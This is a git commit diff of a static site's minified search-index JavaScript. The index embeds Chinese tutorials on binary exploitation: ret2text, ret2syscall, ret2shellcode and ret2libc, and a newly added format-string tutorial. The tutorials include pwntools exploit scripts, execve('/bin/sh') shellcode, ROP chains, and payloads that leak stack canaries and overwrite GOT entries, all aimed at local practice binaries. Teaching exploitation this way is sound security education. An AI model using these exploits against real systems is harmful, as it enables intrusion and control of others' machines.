023c96f2e13fe8e86023c1909106643c6a950229
c3n1gbr0k3n <c3n1gbr0k3n@users.noreply.github.com>
2023-04-11 14:17:37 +0000

    deploy: e7b1f9eeb66fa1db63c525a93420763e9d26f562

--- index.min.2112a64fac626a8ff27d0f4bca7ec6873382b5ac154b57c1fefb61c823e4fb673887ea3d04576e5074c9750f29f10ba5d66215bc182c27c635d2fabbc4d57645.js
+++ index.min.2112a64fac626a8ff27d0f4bca7ec6873382b5ac154b57c1fefb61c823e4fb673887ea3d04576e5074c9750f29f10ba5d66215bc182c27c635d2fabbc4d57645.js
@@ -1,4 +1,4 @@
-var suggestions=document.getElementById("suggestions"),search=document.getElementById("search");search!==null&&document.addEventListener("keydown",inputFocus);function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}document.addEventListener("click",function(e){var t=suggestions.contains(e.target);t||suggestions.classList.add("d-none")}),document.addEventListener("keydown",suggestionFocus);function suggestionFocus(e){const s=suggestions.classList.contains("d-none");if(s)return;const t=[...suggestions.querySelectorAll("a")];if(t.length===0)return;const n=t.indexOf(document.activeElement);if(e.key==="ArrowUp"){e.preventDefault();const s=n>0?n-1:0;t[s].focus()}else if(e.key==="ArrowDown"){e.preventDefault();const s=n+1<t.length?n+1:n;t[s].focus()}}(function(){var e=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",store:["href","title","description"],index:["title","description","content"]}});e.add({id:0,href:"/docs/exploit/stackoverflow/ret2text/",title:"ret2text",description:`0x01 介绍 # 栈是进程最常用到的内存类型之一，它具有高效和简单的特点，主要用来存储函数调用信息。通常来说32位的程序一个栈单元为4个字节，而64位程序一个栈单元为8个字节，然后多个栈单元可以组成一个 栈帧 ，栈帧的大小主要看函数信息的多少。一个栈单元通常包括以下几部分：
+var suggestions=document.getElementById("suggestions"),search=document.getElementById("search");search!==null&&document.addEventListener("keydown",inputFocus);function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}document.addEventListener("click",function(e){var t=suggestions.contains(e.target);t||suggestions.classList.add("d-none")}),document.addEventListener("keydown",suggestionFocus);function suggestionFocus(e){const s=suggestions.classList.contains("d-none");if(s)return;const t=[...suggestions.querySelectorAll("a")];if(t.length===0)return;const n=t.indexOf(document.activeElement);if(e.key==="ArrowUp"){e.preventDefault();const s=n>0?n-1:0;t[s].focus()}else if(e.key==="ArrowDown"){e.preventDefault();const s=n+1<t.length?n+1:n;t[s].focus()}}(function(){var e=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",store:["href","title","description"],index:["title","description","content"]}});e.add({id:0,href:"/docs/exploit/formatstring/",title:"FormatString",description:"",content:""}),e.add({id:1,href:"/docs/exploit/stackoverflow/ret2text/",title:"ret2text",description:`0x01 介绍 # 栈是进程最常用到的内存类型之一，它具有高效和简单的特点，主要用来存储函数调用信息。通常来说32位的程序一个栈单元为4个字节，而64位程序一个栈单元为8个字节，然后多个栈单元可以组成一个 栈帧 ，栈帧的大小主要看函数信息的多少。一个栈单元通常包括以下几部分：
 函数的参数，一般有父函数压入栈中 函数的返回地址，即函数执行完后ret跳转的地址 帧指针，即上一个栈帧的位置 局部变量，即函数内部声明的变量 栈有三大很重要的作用，同时也体现在栈帧结构里面了：
 保存函数的局部变量 函数调用时传递参数 保存函数返回后的地址 而我们所有的栈溢出基本都是围绕着三大作用在进行，包括这里的ret2text题型。这种题型比较简单，它主要利用的是第三大功能，即函数返回地址，我们可以来看一个简单的程序的汇编代码
 void main() { int a = 1; int b = 2; } // gcc -m32 test.c -o test -fno-pic -fno-stack-protector -no-pie 生成的汇编代码为
@@ -19,7 +19,7 @@ gets 函数，遇到 \\n 截断，不保留 \\n 字符串后面添加 \\x00 f
 最后找getshell代码片段
 你可以直接用hint函数地址，也可以只用从给system函数传递参数处的指令开始，两者结果是一样的
 最后我们就可以编写攻击脚本了
-from pwn import* # 引入pwntools包 o = process(\u0026quot;./ret2text\u0026quot;) # 执行ret2text程序并获取其I/O接口 payload = b'a'*24 # 填充变量与函数返回地址的空隙 payload += p64(0x4005d6) # 0x4005d6是getshell代码片段地址，p64的作用是将地址打包成小端序填入栈单元 o.sendline(payload) # 发送payload，会在结尾加 '\\n' o.interactive() # 进入交互模式 `}),e.add({id:1,href:"/docs/exploit/stackoverflow/ret2syscall/",title:"ret2syscall",description:`0x01 介绍 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
+from pwn import* # 引入pwntools包 o = process(\u0026quot;./ret2text\u0026quot;) # 执行ret2text程序并获取其I/O接口 payload = b'a'*24 # 填充变量与函数返回地址的空隙 payload += p64(0x4005d6) # 0x4005d6是getshell代码片段地址，p64的作用是将地址打包成小端序填入栈单元 o.sendline(payload) # 发送payload，会在结尾加 '\\n' o.interactive() # 进入交互模式 `}),e.add({id:2,href:"/docs/exploit/stackoverflow/ret2syscall/",title:"ret2syscall",description:`0x01 介绍 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
 我们可以看一下32位的系统调用号
 前部分是系统调用名称，比如 __NR_read 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 3 就是read的系统调用号0。64位的系统调用号也是同理。
 当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 ebx、ecx、edx、esi、edi ，对于64位来说顺序为 rdi、rsi、rdx、rcx、r8、r9 。我们以内联汇编的形式来实现一个简单的系统调用
@@ -39,7 +39,7 @@ char *buf = \u0026quot;hello world\\n\u0026quot;; void main(); asm( \u0026quot;.
 然后我们需要找出这些代码片段的地址，这里可以使用 ROPgadget 工具来查找
 而execve的系统调用号在文件中可以查到为 11 ，通过调试我们可以知道当run函数执行到ret指令的时候eax寄存器的值为1。
 所以inc指令只需要执行10次即可。最终可以写出Exploit
-from pwn import* o = process(\u0026quot;./ret2syscall\u0026quot;) bin_sh = 0x8048550 # /bin/sh字符串地址 pop_ebx = 0x8048311 # pop ebx;ret代码片段地址 xor_ret = 0x8048471 # xor ecx, ecx;xor edx, edx;ret代码片段地址 int_80 = 0x8048476 # int 0x80代码片段地址 inc_eax = 0x804846b # inc eax;ret代码片段地址 payload = b'a'*28 # 填充局部变量和函数返回地址之间的空隙 payload += p32(pop_ebx) + p32(bin_sh) # 设置第一个参数寄存器 payload += p32(xor_ret) # 设置第二三个参数寄存器 payload += p32(inc_eax)*10 # eax累加到11 payload += p32(int_80) # 执行系统调用 o.sendline(payload) o.interactive() `}),e.add({id:2,href:"/docs/exploit/stackoverflow/ret2shellcode/",title:"ret2shellcode",description:`0x01 介绍 # ret2shellcode用到的知识也是系统调用，只不过和ret2syscall的区别在于后者是利用程序里已有的代码片段，而前者是需要自己写系统调用代码编译后注入到内存里，然后跳转到我们写入的地方来执行我们写入的代码，我们称这种代码为shellcode。这种题型的难点就在于shellcode编写，其他的和前面区别不大。最简单的shellcode即execve系统调用的写法为
+from pwn import* o = process(\u0026quot;./ret2syscall\u0026quot;) bin_sh = 0x8048550 # /bin/sh字符串地址 pop_ebx = 0x8048311 # pop ebx;ret代码片段地址 xor_ret = 0x8048471 # xor ecx, ecx;xor edx, edx;ret代码片段地址 int_80 = 0x8048476 # int 0x80代码片段地址 inc_eax = 0x804846b # inc eax;ret代码片段地址 payload = b'a'*28 # 填充局部变量和函数返回地址之间的空隙 payload += p32(pop_ebx) + p32(bin_sh) # 设置第一个参数寄存器 payload += p32(xor_ret) # 设置第二三个参数寄存器 payload += p32(inc_eax)*10 # eax累加到11 payload += p32(int_80) # 执行系统调用 o.sendline(payload) o.interactive() `}),e.add({id:3,href:"/docs/exploit/stackoverflow/ret2shellcode/",title:"ret2shellcode",description:`0x01 介绍 # ret2shellcode用到的知识也是系统调用，只不过和ret2syscall的区别在于后者是利用程序里已有的代码片段，而前者是需要自己写系统调用代码编译后注入到内存里，然后跳转到我们写入的地方来执行我们写入的代码，我们称这种代码为shellcode。这种题型的难点就在于shellcode编写，其他的和前面区别不大。最简单的shellcode即execve系统调用的写法为
 获取 /bin/sh 字符串地址 将字符串地址赋值给第一个参数寄存器 将第二三参数寄存器置零 将系统调用号存入ax寄存器 执行内陷指令 32位的汇编代码为
 push 0x0068732f push 0x6e69622f # \u0026quot;/bin/sh\u0026quot;字符串按照小端序压入到栈中 mov ebx, esp # 当前栈顶即esp指向的是\u0026quot;/bin/sh\u0026quot;字符串，将esp的值即字符串指针赋值给ebx xor ecx, ecx # ecx置零 xor edx, edx # edx置零 mov eax, 11 # 将execve系统调用号给eax int 0x80 # 执行系统调用 64位的汇编代码为
 mov rax, 0x0068732f6e69622f push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 59 syscall 值得注意的是64位不能直接将8个字节直接push进栈里，必须借助寄存器才可以将 /bin/sh 字符串压入栈中
@@ -58,7 +58,7 @@ mprotect(0x10000, 0x1000, 7) 第一个参数是你要修改内存区域的地址
 #include\u0026lt;stdio.h\u0026gt; char buf[0x50]; void run() { char name[0x10]; printf(\u0026quot;name: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, name); printf(\u0026quot;content: \u0026quot;); scanf(\u0026quot;%s\u0026quot;, buf); } int main() { run(); return 0; } // gcc ret2shellcode.c -o ret2shellcode -m32 -no-pie -fno-pic -fno-stack-protector -z execstack 这里第一次输入存在栈溢出，而第二次输入是输入到buf中，buf是未初始化数组，保存在了bss段中，由于没有加PIE保护，所以buf地址是已知的，那么我们就可以将shellcode注入到buf中，然后覆盖函数返回地址为buf地址，即可通过ret跳转执行我们的shellcode
 这样我们就可以写出最终的Exploit
 from pwn import* context.log_level = 'debug' # 设置为调试模式 context.arch = 'i386' # 设置系统架构，要不然编译汇编代码会出错 o = process(\u0026quot;./ret2shellcode\u0026quot;) # 第一次输入，栈溢出覆盖函数返回地址为buf地址 payload = b'a'*28 + p32(0x804a040) o.sendline(payload) # execve(\u0026quot;/bin/sh\u0026quot;, 0, 0) shellcode = ''' push 0x0068732f push 0x6e69622f push esp pop ebx xor ecx, ecx xor edx, edx mov eax, 59 xor eax, 48 # 由于11是scanf的截断字符，所以通过先将eax赋值为59，再将eax和48异或eax即可得到11 int 0x80 ''' payload = asm(shellcode) # 编译汇编代码 o.sendline(payload) # 将编译好的机器码写入到buf中 o.interactive() 建议调试看看具体过程
-`}),e.add({id:3,href:"/docs/exploit/stackoverflow/ret2libc/",title:"ret2libc",description:`0x01 介绍 # 我们一般gcc编译不加 -static 的话默认就是动态链接，动态链接就是不将代码嵌入到你的程序中，而是等程序运行时再链接到动态链接库，从而减小程序的大小。我们可以对比以下动态和静态的区别
+`}),e.add({id:4,href:"/docs/exploit/stackoverflow/ret2libc/",title:"ret2libc",description:`0x01 介绍 # 我们一般gcc编译不加 -static 的话默认就是动态链接，动态链接就是不将代码嵌入到你的程序中，而是等程序运行时再链接到动态链接库，从而减小程序的大小。我们可以对比以下动态和静态的区别
 #include\u0026lt;stdio.h\u0026gt; int main() { puts(\u0026quot;hello world\\n\u0026quot;); return 0; } // 动态链接: gcc test.c -o test // 静态链接: gcc test.c -o test_static -static 静态链接的话会把很多我们用不到的函数也给添加到程序中
 静态编译的程序在内存中的布局为除了程序本身并没有其他的东西
 而动态链接的话只有两个动态链接库的函数存留（而且保留的不是函数的代码，而是函数的符号）
@@ -111,4 +111,64 @@ from pwn import* context.log_level = 'debug' o = process(\u0026quot;./ret2libc3\
 接收到的前4个字节就是gets函数实际地址小端序形式，如果你没有在sendline之前将I/O里的接收都清空，即sendline之前没有加recv，可能会有如下的可能
 之前没清空的会一次性都出来。最后取消注释看一下脚本的执行
 具体的可以自己多调试看看
-`}),e.add({id:4,href:"/docs/exploit/",title:"Exploit",description:"",content:""}),e.add({id:5,href:"/docs/exploit/stackoverflow/",title:"StackOverflow",description:"",content:""}),e.add({id:6,href:"/docs/",title:"Docs",description:"learn docs",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()
+`}),e.add({id:5,href:"/docs/exploit/",title:"Exploit",description:"",content:""}),e.add({id:6,href:"/docs/exploit/formatstring/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/",title:"格式化字符串漏洞",description:`0x01 介绍 # 在学习C语言的时候，一般第一个学习的函数就是printf函数。它最常用的用法是通过格式化字符串来格式化输出内容，例如
+printf(\u0026quot;%s\u0026quot;, buf); 但是也可以简单的写为
+printf(buf); 这样也可以将buf字符串内容打印出来。但是这样做有个很大的风险，printf默认它的第一个参数中如果有格式化控制符则会进行解析，如果你对buf字符串输入了格式化控制符的话，这里就会出错，这个就是格式化字符串漏洞。
+当我们往buf里输入格式化控制符的话，它会去找对应的参数进行解析，这里所谓的参数就是给printf的第一个之后的参数。但是我们简写的例子并没有给它第二个参数，它就会按照调用约定，自动认为后一个值为它的参数，然后我们可以利用格式化控制符对其进行操作。
+在此之前我们需要详细的学习一下格式化控制符以及修饰符。
+常用的格式化控制符有如下几个：
+%d：有符号十进制
+%u：无符号十进制
+%x：十六进制整数
+%s: 字符串
+%p：指针格式
+%n：将前面打印的字节数写入到给定指针指向的地方
+#include\u0026lt;stdio.h\u0026gt; int main() { int a = 10; printf(\u0026quot;%d\\n\u0026quot;, a); printf(\u0026quot;%x\\n\u0026quot;, a); printf(\u0026quot;%p\\n\u0026quot;, \u0026amp;a); // 打印的是a的地址 printf(\u0026quot;aaaa%n\\n\u0026quot;, \u0026amp;a); // 写入变量a中 printf(\u0026quot;%d\\n\u0026quot;, a); return 0; } 而修饰符有以下几个常用的：
+宽度控制符，控制输出的宽度，形式为 %nd ，即输出n位宽度的字符串，如果不足则补空格右对齐
+printf(\u0026quot;%4d\u0026quot;, 10); // 输出 \u0026quot; 10\u0026quot; 标志修饰符，控制输出的格式，常用的有以下几个
+#：对于不同进制输出标志性字符
+printf(\u0026quot;%#x\u0026quot;, 10); // 输出 \u0026quot;0xa\u0026quot; 0：用0填充输出的宽度不足的部分，只对数字类型有效
+printf(\u0026quot;%04d\u0026quot;, 1); // 输出 \u0026quot;0001\u0026quot; -：左对齐输出
+printf(\u0026quot;%-2d\u0026quot;, 1); // 输出 \u0026quot;1 \u0026quot; +：输出数值类型时始终显示正负号`,content:`0x01 介绍 # 在学习C语言的时候，一般第一个学习的函数就是printf函数。它最常用的用法是通过格式化字符串来格式化输出内容，例如
+printf(\u0026quot;%s\u0026quot;, buf); 但是也可以简单的写为
+printf(buf); 这样也可以将buf字符串内容打印出来。但是这样做有个很大的风险，printf默认它的第一个参数中如果有格式化控制符则会进行解析，如果你对buf字符串输入了格式化控制符的话，这里就会出错，这个就是格式化字符串漏洞。
+当我们往buf里输入格式化控制符的话，它会去找对应的参数进行解析，这里所谓的参数就是给printf的第一个之后的参数。但是我们简写的例子并没有给它第二个参数，它就会按照调用约定，自动认为后一个值为它的参数，然后我们可以利用格式化控制符对其进行操作。
+在此之前我们需要详细的学习一下格式化控制符以及修饰符。
+常用的格式化控制符有如下几个：
+%d：有符号十进制
+%u：无符号十进制
+%x：十六进制整数
+%s: 字符串
+%p：指针格式
+%n：将前面打印的字节数写入到给定指针指向的地方
+#include\u0026lt;stdio.h\u0026gt; int main() { int a = 10; printf(\u0026quot;%d\\n\u0026quot;, a); printf(\u0026quot;%x\\n\u0026quot;, a); printf(\u0026quot;%p\\n\u0026quot;, \u0026amp;a); // 打印的是a的地址 printf(\u0026quot;aaaa%n\\n\u0026quot;, \u0026amp;a); // 写入变量a中 printf(\u0026quot;%d\\n\u0026quot;, a); return 0; } 而修饰符有以下几个常用的：
+宽度控制符，控制输出的宽度，形式为 %nd ，即输出n位宽度的字符串，如果不足则补空格右对齐
+printf(\u0026quot;%4d\u0026quot;, 10); // 输出 \u0026quot; 10\u0026quot; 标志修饰符，控制输出的格式，常用的有以下几个
+#：对于不同进制输出标志性字符
+printf(\u0026quot;%#x\u0026quot;, 10); // 输出 \u0026quot;0xa\u0026quot; 0：用0填充输出的宽度不足的部分，只对数字类型有效
+printf(\u0026quot;%04d\u0026quot;, 1); // 输出 \u0026quot;0001\u0026quot; -：左对齐输出
+printf(\u0026quot;%-2d\u0026quot;, 1); // 输出 \u0026quot;1 \u0026quot; +：输出数值类型时始终显示正负号
+printf(\u0026quot;%+d\u0026quot;, 2); // 输出 \u0026quot;+2\u0026quot; 精度修饰符，用来控制浮点数输出的小数位数或者字符串输出的字符个数，例如 %.ns ，输出字符串时保留n个字节
+printf(\u0026quot;%.3s\u0026quot;, \u0026quot;hello\u0026quot;); // 输出 \u0026quot;hel\u0026quot; 长度修饰符，控制输出数据的大小，常用的有
+hh：一个字节大小
+printf(\u0026quot;%hhx\u0026quot;, 0x123456789abcdef0); // 输出 \u0026quot;f0\u0026quot; h：两个字节
+printf(\u0026quot;%hx\u0026quot;, 0x123456789abcdef0); // 输出 \u0026quot;def0\u0026quot; l：4个字节
+printf(\u0026quot;%lx\u0026quot;, 0x123456789abcdef0); // 输出 \u0026quot;9abcdf0\u0026quot; ll：8个字节
+printf(\u0026quot;%llx\u0026quot;, 0x123456789abcdef0); // 输出 \u0026quot;123456789abcdef0\u0026quot; 参数控制符，可以控制访问第几个参数，形式为 %n$d ，可以访问printf第n+1个参数
+printf(\u0026quot;%2$d\u0026quot;, 1, 2, 3); // 输出 \u0026quot;2\u0026quot; 学过了这些基本知识再来看看格式化字符串漏洞的两种表现形式：任意读和任意写。任意读比较好理解，我们一开始的那个例子就是任意读的应用，可以读取栈中的内容，如果我们加上参数控制符，那么就可以任意读取栈中你想要的数据
+而栈里面有很多有用数据，比如canary值、栈地址和libc地址，然后我们通过任意读就可以来绕过canary、计算libc基地址等操作。一般用%p来泄露栈中数据比较多，因为它可以将数据以指针的形式打印出来。但是它只能打印栈中的内容，如果要打印指定地方的值，比如bss、got表等地方，你可以用%s来打印，%s会接收一个指针作为参数，然后打印指针指向地方的数据。
+我们先尝试泄露栈内容试试，举个例子
+#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main() { setbuf(stdout, 0); // printf是缓存型输出，如果你不设置stdout的缓冲区为0的话，则可能不能及时获取输出 char buf[0x10]; printf(\u0026quot;input: \\n\u0026quot;); scanf(\u0026quot;%16s\u0026quot;, buf); printf(buf); return 0; } // gcc format_leak_x32.c -m32 -o format_leak_x32 这是一个32位的程序，然后加了canary保护，我们可以通过这里的格式化字符串漏洞来尝试泄露canary值，我们把断点设置在格式化字符串漏洞处，来看一下栈的布局
+从图中不难看出，canary的位置相当于格式化字符串的第十一个参数，所以我们可以通过 %11$p 将canary值泄露出来
+这个泄露出来的值可以看出来很明显的canary特征。我们再将其编译为64位程序来看一下
+gcc format_leak_x32.c -o format_leak_x64 64位和32位不同的地方在于64位函数的前6个参数都是通过寄存器来传递的，超过的才会用到栈
+所以这里canary对于格式化字符串参数的偏移量为5个参数寄存器+4个栈单元=9，输入 %9$p 即可泄露canary值
+再来看看如何泄露其他地方的值，比如泄露got表内容，还是以上面那个32位例子来看，我们这里需要用到got表的地址再加上 %s 即可泄露。首先我们需要通过调试来确定buf距离格式化字符串的偏移量，因为我们的got表地址是存储在buf中的，我们需要通过参数控制符来让 %s 读取该地址的内容。从之前的分析可以看到偏移量为7，所以payload可以这样写
+payload = p32(printf_got) + b\u0026quot;%7$s\u0026quot; 任意写则是通过 %n 来实现，该格式控制符也需要一个指针来作为参数，通常该格式化控制符一次性写入的是4个字节，但是我们可以通过长度控制符来控制一次性写入的字节，举个例子
+#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int a = 0x12345678; int main() { char buf[0x10]; scanf(\u0026quot;%16s\u0026quot;, buf); printf(buf); printf(\u0026quot;\\na: %x\\n\u0026quot;, a); if(a == 0x12345604) { system(\u0026quot;/bin/sh\u0026quot;); } else { printf(\u0026quot;err\\n\u0026quot;); } return 0; } // gcc format_attack_x32.c -o format_attack_x32 -no-pie -m32 如果不加长度控制符的话，则会覆盖掉a所有的值
+from pwn import * # context.log_level = 'debug' o = process(\u0026quot;./format_attack_x32\u0026quot;) elf = ELF(\u0026quot;./format_attack_x32\u0026quot;) a = 0x804a02c payload = p32(a) + b\u0026quot;%7$n\u0026quot; o.sendline(payload) o.interactive() 但是如果我们加上长度控制符，只覆盖一个字节的话，则会不同
+from pwn import * # context.log_level = 'debug' o = process(\u0026quot;./format_attack_x32\u0026quot;) elf = ELF(\u0026quot;./format_attack_x32\u0026quot;) a = 0x804a02c payload = p32(a) + b\u0026quot;%7$hhn\u0026quot; o.sendline(payload) o.interactive() 接下来我们尝试通过格式化字符串漏洞任意写got表内容为getshell函数地址，以一个例子来讲
+#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void hint() { system(\u0026quot;/bin/sh\u0026quot;); } int main() { setbuf(stdout, 0); char buf[0x20]; scanf(\u0026quot;%s\u0026quot;, buf); printf(buf); exit(0); } // gcc format_attack.c -o format_attack -m32 -no-pie 32位程序的地址一般都是满4个字节的，但是通过格式化字符串漏洞任意写的话首先要打印很长的字节才行，这样既低效又有可能执行失败。这里就得采用宽度控制符+分段覆盖的方法来完成。我们可以采取每两个字节一覆盖的形式来完成，首先我们来看一下hint函数的地址
+0x0804851b，这个数字的后两个字节大小比前两个字节的大小要大，所以我们可先考虑写入exit的got表高两位，再写入它的低两位。首先我们先想想如何写入前两个字节，在payload我们由于要分两段写入的，所以会在最前面放两个地址即exit的got表+2地址和exit的got表地址，这里就有了8个字节，然后还需要再打印0x804-8个字节打印出的字节才可以达到前两个字节的大小，这时候再通过 %hn 写入两个字节到got表+2的位置。接着来想办法写入后两个字节，前面已经打印了0x804个字节的内容了，然后还需要打印0x851b-0x804个字节才能满足后两个字节的大小，这时候再通过 %hn 写入两个字节到got表的位置。所以payload可以写为
+payload = p32(exit_got+2) + p32(exit_got) payload += \u0026quot;%{}d%7$hn\u0026quot;.format(0x804-8) payload += \u0026quot;%{}d%8$hn\u0026quot;.format(0x851b-0x804) 前面一大段的空白是宽度控制符打印出来的空格，这时候exit的got表就已经填为了hint函数的地址了。而我们学过call函数的时候会首先跳转到plt表执行，然后plt里第一条指令是跳转去执行对应got表里存储的地址，这里我们已经覆盖为hint后，调用exit函数就会直接跳转去执行hint函数了
+`}),e.add({id:7,href:"/docs/exploit/stackoverflow/",title:"StackOverflow",description:"",content:""}),e.add({id:8,href:"/docs/",title:"Docs",description:"learn docs",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()
